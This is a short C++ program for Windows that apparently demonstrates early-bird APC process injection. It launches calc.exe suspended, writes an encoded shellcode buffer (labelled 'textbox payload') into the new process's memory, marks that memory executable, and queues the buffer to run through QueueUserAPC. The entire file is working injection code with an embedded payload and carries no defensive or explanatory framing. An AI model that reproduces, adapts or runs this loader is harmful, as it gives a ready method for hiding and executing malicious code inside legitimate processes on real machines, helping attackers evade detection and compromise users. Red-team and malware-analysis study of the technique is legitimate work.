#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>                                                                        // Windows API stuff
#include <iostream>
#include <tlhelp32.h>                                        

int main()
{
unsigned char buf[]= "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"      // textbox payload
"\xff\xff\xff\x48\xbb\x74\x62\x99\x4f\xb2\x65\x42\x0e\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x88\x2a\x1a"
"\xab\x42\x8d\x82\x0e\x74\x62\xd8\x1e\xf3\x35\x10\x5f\x22"
"\x2a\xa8\x9d\xd7\x2d\xc9\x5c\x14\x2a\x12\x1d\xaa\x2d\xc9"
"\x5c\x54\x2a\x12\x3d\xe2\x2d\x4d\xb9\x3e\x28\xd4\x7e\x7b"
"\x2d\x73\xce\xd8\x5e\xf8\x33\xb0\x49\x62\x4f\xb5\xab\x94"
"\x0e\xb3\xa4\xa0\xe3\x26\x23\xc8\x07\x39\x37\x62\x85\x36"
"\x5e\xd1\x4e\x62\xee\xc2\x86\x74\x62\x99\x07\x37\xa5\x36"
"\x69\x3c\x63\x49\x1f\x39\x2d\x5a\x4a\xff\x22\xb9\x06\xb3"
"\xb5\xa1\x58\x3c\x9d\x50\x0e\x39\x51\xca\x46\x75\xb4\xd4"
"\x7e\x7b\x2d\x73\xce\xd8\x23\x58\x86\xbf\x24\x43\xcf\x4c"
"\x82\xec\xbe\xfe\x66\x0e\x2a\x7c\x27\xa0\x9e\xc7\xbd\x1a"
"\x4a\xff\x22\xbd\x06\xb3\xb5\x24\x4f\xff\x6e\xd1\x0b\x39"
"\x25\x5e\x47\x75\xb2\xd8\xc4\xb6\xed\x0a\x0f\xa4\x23\xc1"
"\x0e\xea\x3b\x1b\x54\x35\x3a\xd8\x16\xf3\x3f\x0a\x8d\x98"
"\x42\xd8\x1d\x4d\x85\x1a\x4f\x2d\x38\xd1\xc4\xa0\x8c\x15"
"\xf1\x8b\x9d\xc4\x06\x0c\x12\x31\x3c\x2b\x51\xab\x4f\xb2"
"\x24\x14\x47\xfd\x84\xd1\xce\x5e\xc5\x43\x0e\x74\x2b\x10"
"\xaa\xfb\xd9\x40\x0e\x75\xd9\xfe\xd1\x99\x77\x03\x5a\x3d"
"\xeb\x7d\x03\x3b\x94\x03\xb4\x38\x15\xbf\x48\x4d\xb0\x0e"
"\x87\x9e\x0a\x98\x4e\xb2\x65\x1b\x4f\xce\x4b\x19\x24\xb2"
"\x9a\x97\x5e\x24\x2f\xa8\x86\xff\x54\x82\x46\x8b\xa2\xd1"
"\xc6\x70\x2d\xbd\xce\x3c\xeb\x58\x0e\x08\x8f\x4d\xd1\x94"
"\x9d\x4c\x07\x3b\xa2\x28\x1e\x35\x3a\xd5\xc6\x50\x2d\xcb"
"\xf7\x35\xd8\x00\xea\xc6\x04\xbd\xdb\x3c\xe3\x5d\x0f\xb0"
"\x65\x42\x47\xcc\x01\xf4\x2b\xb2\x65\x42\x0e\x74\x23\xc9"
"\x0e\xe2\x2d\xcb\xec\x23\x35\xce\x02\x83\xa5\x28\x03\x2d"
"\x23\xc9\xad\x4e\x03\x85\x4a\x50\x36\x98\x4e\xfa\xe8\x06"
"\x2a\x6c\xa4\x99\x27\xfa\xec\xa4\x58\x24\x23\xc9\x0e\xe2"
"\x24\x12\x47\x8b\xa2\xd8\x1f\xfb\x9a\x8a\x43\xfd\xa3\xd5"
"\xc6\x73\x24\xf8\x77\xb8\x5d\x1f\xb0\x67\x2d\x73\xdc\x3c"
"\x9d\x53\xc4\xbc\x24\xf8\x06\xf3\x7f\xf9\xb0\x67\xde\xb2"
"\xbb\xd6\x34\xd8\xf5\x14\xf0\xff\x93\x8b\xb7\xd1\xcc\x76"
"\x4d\x7e\x08\x08\x68\x19\xb4\x52\x10\x47\xb5\x33\x71\xeb"
"\x20\xd8\x65\x1b\x4f\xfd\xb8\x66\x9a\xb2\x65\x42\x0e"

SIZE_T payload_size = sizeof(buf);

STARTUPINFOA startprocess = { 0 };                                                                      //give configuration and information about the newly create process 
PROCESS_INFORMATION processinfo = { 0 };
PVOID remotebuffer = 0;
DWORD oldprotection = NULL;

char newproc[] = "C:\\Windows\\System32\\calc.exe";                                                   // Create a new process
CreateProcessA(newproc, NULL, NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &startprocess, &processinfo);
HANDLE hprocess = processinfo.hProcess;
HANDLE hthread = processinfo.hThread;
  
//Allocate memory on the newly created process
remotebuffer = VirtualAllocEx(hprocess, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
LPTHREAD_START_ROUTINE apcroutine = (LPTHREAD_START_ROUTINE)remotebuffer;
printf("Allocated the memory : %p\n", remotebuffer);

//Write Payload/shellcode into the remote buffer
WriteProcessMemory(hprocess, remotebuffer, buf, payload_size, NULL);

VirtualProtectEx(hprocess, remotebuffer, payload_size, PAGE_EXECUTE_READ, &oldprotection); // change memory protection to read-execute
QueueUserAPC((PAPCFUNC)apcroutine, hthread, NULL);
ResumeThread(hthread);
}
